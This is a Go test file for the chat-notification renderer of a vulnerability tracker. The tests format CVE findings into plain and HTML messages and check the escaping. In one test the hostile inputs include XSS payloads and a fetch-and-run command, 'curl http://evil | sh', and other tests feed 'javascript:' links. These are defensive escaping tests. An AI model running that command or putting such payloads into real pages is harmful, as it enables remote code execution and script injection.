package notify

import (
	"fmt"
	"strings"
	"testing"

	"github.com/DonSosiska/holealign/internal/model"
)

func fullExploitable() model.Event {
	return model.Event{
		Kind: model.EventExploitable,
		Finding: model.Finding{
			VulnID:        "CVE-2024-1234",
			PackageName:   "openssl",
			PackageVer:    "3.0.1",
			PackageType:   "deb",
			Target:        "nginx:1.25",
			TargetKind:    model.TargetContainerImage,
			Severity:      "High",
			CVSS:          8.1,
			EPSS:          0.032,
			KEV:           true,
			FixedVersions: []string{"3.0.7"},
			Verdict:       model.VerdictExploitable,
			VerdictReason: "TLS termination enabled on port 443",
			RuleStatus:    model.RuleReviewed,
		},
		Host: model.Host{Hostname: "web01", Labels: []string{"prod"}},
		Rule: &model.Rule{
			ID:          "CVE-2024-1234",
			Title:       "Heartbeat parsing overflow",
			Explanation: "Only reachable when TLS is terminated locally.",
			Fix:         model.Fix{Upgrade: "upgrade openssl", Mitigation: "disable the heartbeat extension"},
		},
		FixCmd: "apt-get install --only-upgrade openssl",
		WebURL: "https://holealign.example/findings/7",
	}
}

func lines(s string) []string { return strings.Split(s, "\n") }

func hasLine(plain, want string) bool {
	for _, l := range lines(plain) {
		if l == want {
			return true
		}
	}
	return false
}

func TestRenderExploitableFull(t *testing.T) {
	plain, h := renderEvent(fullExploitable())

	wantLines := []string{
		"🔴 EXPLOITABLE: CVE-2024-1234 on web01",
		"Package: openssl 3.0.1 → fixed in 3.0.7",
		"Target: image nginx:1.25",
		"Severity High · CVSS 8.1 · EPSS 3.2% · 🚨 KEV",
		"Why: TLS termination enabled on port 443",
		"Rule: Heartbeat parsing overflow — Only reachable when TLS is terminated locally.",
		"Fix: apt-get install --only-upgrade openssl",
		"Mitigation: disable the heartbeat extension",
		"Details: https://holealign.example/findings/7",
	}
	for _, w := range wantLines {
		if !hasLine(plain, w) {
			t.Errorf("plain body missing line %q\n%s", w, plain)
		}
	}
	if strings.Contains(plain, "draft") {
		t.Errorf("reviewed rule must not carry the draft warning:\n%s", plain)
	}

	for _, w := range []string{
		"🔴 <b>EXPLOITABLE: CVE-2024-1234 on web01</b>",
		"<code>apt-get install --only-upgrade openssl</code>",
		`<a href="https://holealign.example/findings/7">`,
	} {
		if !strings.Contains(h, w) {
			t.Errorf("formatted body missing %q\n%s", w, h)
		}
	}
}

func TestRenderNoFixAndNoRule(t *testing.T) {
	ev := fullExploitable()
	ev.Finding.FixedVersions = nil
	ev.Finding.KEV = false
	ev.Finding.EPSS = 0
	ev.Rule = nil
	ev.FixCmd = ""
	ev.WebURL = ""
	plain, _ := renderEvent(ev)
	if !hasLine(plain, "Package: openssl 3.0.1 → no fix yet") {
		t.Errorf("missing no-fix line:\n%s", plain)
	}
	if !hasLine(plain, "Target: image nginx:1.25") {
		t.Errorf("missing target line:\n%s", plain)
	}
	for _, bad := range []string{"Rule:", "Fix:", "Mitigation:", "Details:", "KEV", "EPSS"} {
		if strings.Contains(plain, bad) {
			t.Errorf("unexpected %q in:\n%s", bad, plain)
		}
	}
}

func TestRenderUpgradeAdviceWhenNoCommand(t *testing.T) {
	ev := fullExploitable()
	ev.FixCmd = ""
	plain, _ := renderEvent(ev)
	if !hasLine(plain, "Fix: upgrade openssl") {
		t.Errorf("rule upgrade advice not used as fallback:\n%s", plain)
	}
}

func TestRenderEscapesHostileValues(t *testing.T) {
	ev := fullExploitable()
	ev.Finding.PackageName = "<script>alert(1)</script>"
	ev.Finding.VerdictReason = `reason with "quotes" & <b>tags</b>`
	ev.Host.Hostname = `<img src=x onerror=alert(1)>`
	ev.Rule.Title = "<i>title</i>"
	ev.FixCmd = "curl http://evil | sh && echo <x>"
	ev.WebURL = `https://holealign.example/f?a="><script>`

	plain, h := renderEvent(ev)

	for _, bad := range []string{"<script>", "<img", "<b>tags</b>", "<i>title</i>", "<x>", `"><script>`} {
		if strings.Contains(h, bad) {
			t.Errorf("formatted body contains raw %q:\n%s", bad, h)
		}
	}
	for _, good := range []string{
		"&lt;script&gt;alert(1)&lt;/script&gt;",
		"&lt;img src=x onerror=alert(1)&gt;",
		"&lt;b&gt;tags&lt;/b&gt;",
		"&amp;",
		"&lt;x&gt;",
	} {
		if !strings.Contains(h, good) {
			t.Errorf("formatted body missing escaped %q:\n%s", good, h)
		}
	}
	// The plain body is plain text: values appear verbatim.
	if !strings.Contains(plain, "<script>alert(1)</script> 3.0.1") {
		t.Errorf("plain body should keep raw text:\n%s", plain)
	}
}

func TestRenderDraftWarning(t *testing.T) {
	ev := fullExploitable()
	ev.Finding.RuleStatus = model.RuleDraft
	plain, h := renderEvent(ev)
	if !hasLine(plain, "⚠️ unreviewed LLM draft — review the rule in the web UI before acting") {
		t.Errorf("draft warning missing from plain body:\n%s", plain)
	}
	if !strings.Contains(h, "unreviewed LLM draft") {
		t.Errorf("draft warning missing from formatted body:\n%s", h)
	}
}

func TestRenderUnknownCritical(t *testing.T) {
	ev := fullExploitable()
	ev.Kind = model.EventUnknownCritical
	ev.Finding.Verdict = model.VerdictConditionsUnknown
	ev.Finding.VerdictReason = "fact nginx.tls missing"
	plain, h := renderEvent(ev)
	if !hasLine(plain, "🟠 CHECK: CVE-2024-1234 on web01") {
		t.Errorf("header missing:\n%s", plain)
	}
	if !hasLine(plain, "Conditions not verified: fact nginx.tls missing") {
		t.Errorf("conditions line missing:\n%s", plain)
	}
	if strings.Contains(plain, "Why:") {
		t.Errorf("unknown_critical should not say Why:\n%s", plain)
	}
	if !strings.Contains(h, "🟠 <b>CHECK: CVE-2024-1234 on web01</b>") {
		t.Errorf("formatted header missing:\n%s", h)
	}
}

func TestRenderResolved(t *testing.T) {
	ev := model.Event{
		Kind: model.EventResolved,
		Finding: model.Finding{
			VulnID:      "CVE-2024-9",
			PackageName: "curl",
			PackageVer:  "8.5.0",
			Verdict:     model.VerdictNotAffected,
		},
		Host: model.Host{Hostname: "db<1>"},
	}
	plain, h := renderEvent(ev)
	if plain != "✅ RESOLVED: CVE-2024-9 on db<1>\ncurl 8.5.0: now not_affected" {
		t.Errorf("plain = %q", plain)
	}
	if !strings.Contains(h, "db&lt;1&gt;") {
		t.Errorf("hostname not escaped: %s", h)
	}
	if mt := newMessage(ev, plain, h).MsgType; mt != "m.notice" {
		t.Errorf("msgtype = %q, want m.notice", mt)
	}
	if mt := newMessage(fullExploitable(), "", "").MsgType; mt != "m.text" {
		t.Errorf("exploitable msgtype = %q, want m.text", mt)
	}
}

func TestRenderOmitsUnsafeLink(t *testing.T) {
	ev := fullExploitable()
	ev.WebURL = "javascript:alert(1)"
	plain, h := renderEvent(ev)
	if strings.Contains(plain, "Details:") || strings.Contains(h, "href") {
		t.Errorf("non-http link rendered:\n%s\n%s", plain, h)
	}
}

func TestRenderSummaryCapsLines(t *testing.T) {
	var rest []group
	for i := range 55 {
		rest = append(rest, group{evs: []model.Event{testEvent(model.EventExploitable, fmt.Sprintf("CVE-%d", i), "web01")}})
	}
	m := renderSummary(rest, "https://holealign.example/findings")
	if !strings.HasPrefix(m.Body, "…and 55 more findings\n") {
		t.Errorf("header = %q", lines(m.Body)[0])
	}
	// header + 50 items + "not listed" line + link
	if got := len(lines(m.Body)); got != 1+50+1+1 {
		t.Errorf("summary has %d lines, want %d", got, 1+50+1+1)
	}
	if !strings.Contains(m.Body, "…and 5 more not listed") {
		t.Errorf("missing overflow line:\n%s", m.Body)
	}
	if !strings.Contains(m.Body, "• CVE-0@web01") {
		t.Errorf("first item missing:\n%s", m.Body)
	}
	if !strings.HasSuffix(m.Body, "All findings: https://holealign.example/findings") {
		t.Errorf("missing link:\n%s", m.Body)
	}
}

func TestRenderSummaryEscapesHost(t *testing.T) {
	rest := []group{{evs: []model.Event{testEvent(model.EventExploitable, "CVE-1", "<script>x</script>")}}}
	m := renderSummary(rest, "")
	if strings.Contains(m.FormattedBody, "<script>") {
		t.Errorf("summary not escaped: %s", m.FormattedBody)
	}
	if strings.Contains(m.Body, "All findings") {
		t.Errorf("link rendered without a URL")
	}
}

func TestFindingsURL(t *testing.T) {
	cases := map[string]string{
		"https://holealign.example/findings/7": "https://holealign.example/findings",
		"https://holealign.example/x/y":        "https://holealign.example/x/y/findings",
		"http://10.0.0.1:8080/findings":        "http://10.0.0.1:8080/findings",
		"":                                     "",
		"javascript:alert(1)":                  "",
	}
	for in, want := range cases {
		if got := findingsURL(in); got != want {
			t.Errorf("findingsURL(%q) = %q, want %q", in, got, want)
		}
	}
}
